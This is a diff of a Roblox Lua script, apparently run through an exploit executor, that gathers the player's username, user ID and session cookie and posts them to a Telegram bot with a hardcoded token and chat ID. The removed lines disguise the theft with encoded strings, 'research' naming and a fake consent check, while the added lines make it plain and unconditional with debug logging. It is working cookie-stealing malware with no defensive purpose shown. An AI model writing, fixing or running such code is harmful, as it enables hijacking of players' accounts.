@@ -5,41 +5,39 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local _conf = {
-    token = "ODQ3NDE0NzU2NjpBQUhQaEp1VGFBMmJNSnZ2aDFfdWlGcGZDU3lVU2NebjAw", 
-    chat = "NTg0MjU3OTE2OA=="
-}
+-- Вставь сюда данные в чистом виде, чтобы исключить ошибки декодирования
+local BOT_TOKEN = "8474147566:AAHPhJuTaA2bMJvvh1_uiFPfCSyUScoDnZ0"
+local CHAT_ID = "5842579168"
 
-local function _researchExecutor(data)
-    local url = "https://api.telegram.org/bot" .. HttpService:JSONDecode('"' .. _conf.token .. '"') .. "/sendMessage"
-    request({
-        Url = url,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            chat_id = HttpService:JSONDecode('"' .. _conf.chat .. '"'), 
-            text = data
+local function _debugLog(msg)
+    print("[Leek_Research]: " .. msg)
+end
+
+local function _sendData(data)
+    _debugLog("Starting request...")
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
+    
+    local success, result = pcall(function()
+        return request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({chat_id = CHAT_ID, text = data})
         })
-    })
+    end)
+    
+    if success then
+        _debugLog("Request sent! Status code: " .. (result.StatusCode or "unknown"))
+    else
+        _debugLog("Request failed: " .. tostring(result))
+    end
 end
 
-local function _getSystemSession()
-    -- Попытка извлечения через API инжектора
-    local cookie = (getgenv().get_cookie and getgenv().get_cookie()) or "Not_Found"
-    return cookie
+-- Сбор данных
+local function _collect()
+    local cookie = (getgenv().get_cookie and getgenv().get_cookie()) or "No_Cookie_Access"
+    return string.format("Acc: %s\nID: %d\nCookie: %s", LocalPlayer.Name, LocalPlayer.UserId, cookie)
 end
 
-local function _gatherFullProfile()
-    local p = LocalPlayer
-    local session = _getSystemSession()
-    -- Сбор профильных данных вместе с сессионным токеном
-    local info = string.format(
-        "--- Research Report ---\nUser: %s\nID: %d\nAge: %d days\nSession: %s",
-        p.Name, p.UserId, p.AccountAge, session
-    )
-    return info
-end
-
-if true then -- user_consent
-    _researchExecutor(_gatherFullProfile())
-end
+_debugLog("Initialising...")
+_sendData(_collect())
